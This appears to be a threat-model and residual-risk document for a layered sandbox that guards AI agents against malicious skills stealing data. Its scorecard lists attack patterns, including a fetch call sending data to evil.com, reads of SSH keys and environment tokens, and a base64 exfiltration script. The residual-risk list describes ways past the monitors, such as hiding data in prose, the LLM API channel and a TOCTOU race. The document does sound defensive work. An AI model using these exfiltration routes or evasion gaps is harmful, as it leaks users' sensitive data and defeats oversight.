# Scorecard and Residual Risks

## Attack surface map

```
agent container (agent-net, internal, HTTPS_PROXY=agent-proxy)
  ├── agent framework (OpenClaw / Claude Code / etc.)
  │     ├── hardened skills (rewritten SKILL.md)
  │     ├── Claude Code also gets PreToolUse hooks
  │     ├── workspace files: READABLE (user mounted them)
  │     ├── credentials: NONE (not in container)
  │     ├── SSH keys: NONE (not mounted)
  │     ├── eBPF observes every file open
  │     └── seccomp filter: every connect() notifies tg-scanner  ← Layer 1 (hard)
  │
  ├──────→ tg-scanner (on agent-net)                              ← Layer 1 decision-maker
  │           ├── scanner daemon: reads eBPF journal, scans files
  │           ├── taint table: tracks which PIDs read sensitive data
  │           └── connect enforcer: blocks tainted PIDs from network
  │
  │ MCP tool calls (Streamable HTTP)
  ├──────→ tidegate (mirrors + scans all values)       ← Layer 2 (hard)
  │              │
  │              │ MCP (Streamable HTTP)
  │              ▼
  │         mcp-net (internal) → MCP server containers → internet
  │              └── credentials live HERE only
  │
  │ ALL other HTTPS (skill HTTP + LLM API)
  └──────→ agent-proxy (MITM for skills)               ← Layer 3 (hard)
             ├── LLM domains: CONNECT passthrough
             ├── skill domains: MITM + scan + credential injection
             └── everything else: BLOCKED
                   │
                   ▼ proxy-net → internet
```

## Honest scorecard: ClawHavoc through the architecture

Tracing ClawHavoc's actual attack patterns through Tidegate:

| Attack pattern | Result | Why |
|---|---|---|
| `fetch("https://evil.com/exfil?data=...")` | **BLOCKED** | `evil.com` not on agent-proxy allowlist |
| `process.env.SLACK_TOKEN` | **BLOCKED** | No credentials in agent container |
| Read `~/.ssh/id_rsa` | **BLOCKED** | SSH keys not mounted |
| Read workspace files | **ALLOWED** | User mounted them intentionally — hard limit |
| Embed credit card in Slack message | **BLOCKED** | L2 Luhn checksum catches it at gateway |
| Base64-encode bank statement, send to allowed domain | **BLOCKED** | eBPF observes file open; scanner daemon finds credit cards, taints PID; seccomp-notify blocks connect() |
| Python script with `glob("*.csv")` + `base64` + `urllib` | **BLOCKED** | eBPF observes each CSV open; scanner daemon taints PID; connect() blocked regardless of script obfuscation |
| Rephrase sensitive data as prose | **NOT BLOCKED** | No pattern scanner catches semantic encoding |
| Exfiltrate via LLM API request | **NOT BLOCKED** | LLM API key must exist in agent container |

## Residual risks (accepted)

1. **Semantic exfiltration**: A determined agent can embed sensitive data as innocuous natural language in tool call parameters. No pattern-based detection can catch this. This is the fundamental limit of all scanning-based approaches.

2. **Workspace file access**: Files mounted into the agent container are readable by any skill. This is by design — the user wants the agent to use these files. We cannot distinguish legitimate use from exfiltration at the file-read level.

3. **LLM API as exfiltration channel**: The LLM API key must exist in the agent container. A sophisticated attacker could encode data in API requests. Low bandwidth, high complexity, accepted risk.

4. **MCP server supply chain**: If a community MCP server is backdoored, it can misuse its own API access. Mitigated by: pinning versions, reviewing server code, credential scoping (each server only gets its own keys).

5. **Kernel escape**: Docker shares the host kernel. Mitigated by: hardened container config, no root, dropped capabilities. For higher assurance: gVisor or Firecracker.

6. **Network topology misconfiguration**: If Docker networks are misconfigured, the agent can bypass the gateway. Mitigated by: compose templates that enforce the topology, verification tests.

7. **TOCTOU between file observation and scan**: eBPF logs the `openat`, scanner daemon reads the file later. File could change between observation and scan. Mitigated by: shared volume is read-only for tg-scanner (consistent snapshot), but agent container has write access. See `workspace-volume-toctou.md` spike.

8. **tg-scanner availability**: If tg-scanner crashes, pending `connect()` syscalls get `ENOSYS` (fail-open). Mitigated by: hard seccomp-bpf fallback filter that kills the agent container if the notification listener disconnects.

9. **Taint explosion**: If many workspace files contain sensitive data, most child processes become tainted, and connect enforcement becomes overly broad. Mitigated by: calibrating taint to high-confidence scanner findings only (L2 patterns: credit cards, credentials), not low-confidence (L3: entropy).

10. **Agent framework process**: The agent framework process (PID 1) reads files directly and also makes network connections for MCP/LLM calls. Tainting PID 1 blocks all agent functionality. Taint enforcement primarily targets child processes spawned to run scripts.
